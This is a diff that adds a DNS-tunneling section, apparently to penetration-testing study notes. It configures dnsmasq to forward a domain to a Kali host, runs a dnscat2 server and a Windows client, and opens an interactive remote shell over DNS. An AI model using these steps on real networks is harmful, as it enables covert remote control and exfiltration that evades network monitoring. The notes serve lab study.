@@ -62,3 +62,50 @@ TXT: "686f73746e616d65"
 ## DNS Tunneling with dnscat2
 [dnscat2](https://github.com/iagox86/dnscat2) is a DNS tunneling utility. It can tunnel A, TXT, and NS records. Let's consider the follwing network digram.
 
+
+![image](https://user-images.githubusercontent.com/24555370/145134133-776aaf38-f8ea-49c7-9e4a-9020a5859446.png)
+
+We will configure dnsmasq DNS server to forward requests to our kali. The domain name will bne tunnel.com.
+
+configure /etc/dnsmasq.conf file on the Ubuntu machine, Note, the IP address are point to Kali machine
+```
+server=/tunnel.com/kaliIP
+server=/somedomain.com/KaliIP
+```
+restart dns
+```
+dns@ubuntu:~$ sudo systemctl restart dnsmasq
+```
+
+On our kali machine, we have to start dnscat2-server for our example tunnel.com domain
+
+```
+kali@kali:~$ sudo apt install dnscat2
+
+kali@kali:~$ dnscat2-server tunnel.com
+```
+
+Now on the windows target machine
+
+```
+C:\Users\mst\Desktop> dnscat2-v0.07-client-win32.exe tunnel.com
+```
+
+Now, we have established a DNS tunnel, on the kali side, interact with the seesion using the  ```session -i [number]```, we can run an interactive shell with the ```shell``` command
+```
+dnscat2> session -i 1
+New window created: 1
+history_size (session) => 1000
+
+command (client) 1> shell
+Sent request to execute a shell
+command (client) 1> New window created: 2
+Shell session created!
+command (client) 1> session -i 2
+
+
+C:\Users\mst\Desktop>
+cmd.exe (client) 2> whoami
+client\offsec
+```
+
